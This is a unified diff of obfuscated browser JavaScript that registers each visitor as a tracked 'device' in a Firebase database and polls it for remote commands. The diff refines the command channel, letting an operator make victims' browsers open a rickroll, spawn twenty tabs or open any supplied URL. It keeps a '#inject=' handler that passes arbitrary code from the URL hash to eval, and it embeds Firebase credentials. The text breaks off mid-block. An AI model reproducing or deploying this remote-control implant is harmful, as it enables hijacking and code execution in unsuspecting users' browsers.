@@ -1,16 +1,20 @@
 (async () => {
   const _0x2082a5 = "dev_" + Math.random().toString(0x24).substring(0x2, 0xa);
+
   const _0x56b199 = async () => {
     const _0xec927a = document.createElement("script");
     _0xec927a.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js';
     document.head.appendChild(_0xec927a);
-    await new Promise(_0x44f5e0 => _0xec927a.onload = _0x44f5e0);
+    await new Promise(res => _0xec927a.onload = res);
+
     const _0x554a6c = document.createElement("script");
     _0x554a6c.src = "https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js";
     document.head.appendChild(_0x554a6c);
-    await new Promise(_0x265e3b => _0x554a6c.onload = _0x265e3b);
+    await new Promise(res => _0x554a6c.onload = res);
   };
+
   await _0x56b199();
+
   const _0x1e46fb = {
     'apiKey': "AIzaSyD5hBBFtSWYOMIk1ZeLqcUKsAubdok4FWk",
     'authDomain': "nebcasino-5aca1.firebaseapp.com",
@@ -20,50 +24,67 @@
     'messagingSenderId': "907673467348",
     'appId': "1:907673467348:web:37b0bcbad757f95845fe41"
   };
+
   firebase.initializeApp(_0x1e46fb);
   const _0x6df803 = firebase.database();
+
   const _0x3cd585 = _0x6df803.ref("sessions/public/devices/" + _0x2082a5);
+
   const _0x3abde3 = () => _0x3cd585.update({
     'online': true,
     'lastSeen': Date.now()
   });
+
   _0x3cd585.update({
     'online': true,
     'lastSeen': Date.now()
   });
+
   setInterval(_0x3abde3, 0xea60);
+
   window.addEventListener('beforeunload', () => {
     _0x3cd585.update({
       'online': false,
       'lastSeen': Date.now()
     });
   });
+
   _0x3cd585.onDisconnect().update({
     'online': false,
     'lastSeen': Date.now()
   });
-  _0x3cd585.child("action").on("value", _0x3b2c59 => {
-    const _0x35b607 = _0x3b2c59.val();
-    if (!_0x35b607) {
-      return;
-    }
+
+  // CHANGED: use "child_changed" so repeated same values still trigger
+  _0x3cd585.child("action").on("child_changed", snapshot => {
+    const _0x35b607 = snapshot.val();
+    if (!_0x35b607) return;
+
+    // Support string action
     if (_0x35b607 === "rickroll") {
       window.open("https://www.gifcen.com/wp-content/uploads/2022/11/rick-roll-gif-7.gif", "_blank");
     }
+
     if (_0x35b607 === "tabs") {
-      for (let _0x33ce18 = 0x0; _0x33ce18 < 0x14; _0x33ce18++) {
+      for (let i = 0; i < 20; i++) {
         window.open("https://www.google.com", "_blank");
       }
     }
-    if (typeof _0x35b607 === "object" && _0x35b607.type === 'injectTab' && _0x35b607.url) {
-      window.open(_0x35b607.url, "_blank");
+
+    // Support object-based actions
+    if (typeof _0x35b607 === "object") {
+      if (_0x35b607.type === 'rickroll') {
+        window.open("https://www.gifcen.com/wp-content/uploads/2022/11/rick-roll-gif-7.gif", "_blank");
+      }
+      if (_0x35b607.type === 'injectTab' && _0x35b607.url) {
+        window.open(_0x35b607.url, "_blank");
+      }
     }
-    _0x3cd585.child("action").set(null);
   });
+
   const _0x55983c = location.hash;
   if (_0x55983c.startsWith("#inject=")) {
     try {
-      const _0x2568f9 = decodeURIComponent(_0x55983c.slice(0x8));
+      const _0x2568f9 = decodeURIComponent(_0x55983c.slice(8));
       eval(_0x2568f9);
     } catch (_0x59de70) {
       console.error("Injection error:", _0x59de70);
